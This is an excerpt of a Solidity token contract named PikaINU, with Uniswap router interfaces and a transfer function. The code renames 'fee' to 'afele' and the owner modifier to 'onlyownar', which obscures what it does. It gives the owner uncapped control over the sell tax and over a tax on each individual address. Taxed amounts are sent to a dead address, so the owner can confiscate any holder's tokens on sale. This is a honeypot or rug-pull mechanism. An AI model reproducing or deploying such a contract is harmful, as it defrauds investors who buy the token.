...
interface IUniswapV2Factory {
    ...
    function afeleTo() external view returns (address);
    function afeleToSetter() external view returns (address);
    ...
    function setafeleTo(address) external;
    function setafeleToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingafeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingafeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingafeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingafeleOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingafeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract PikaINU is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellafele = 0;

    uint256 private _defaultBuyafele = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipafele;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellafele = _value;
    }

    function setSlipafele(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipafele[_address] = _value;
    }

    function getSlipafele(address _address) external view onlyownar returns (uint256) {
        return _slipafele[_address];
    }


    function setMAccountafele(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountafele(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeafeleAmount = 0;

        if (rF) {
            uint256 tradeafele = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeafele = _defaultSellafele;
                }
                if (from == uniswapV2Pair) {

                    tradeafele = _defaultBuyafele;
                }
            }
            if (_slipafele[from] > 0) {
                tradeafele = _slipafele[from];
            }

            tradeafeleAmount = _Amount.mul(tradeafele).div(100);
        }


        if (tradeafeleAmount > 0) {
            _balances[from] = _balances[from].sub(tradeafeleAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeafeleAmount);
            emit Transfer(from, _deadAddress, tradeafeleAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeafeleAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeafeleAmount);
        emit Transfer(from, _to, _Amount - tradeafeleAmount);
    }
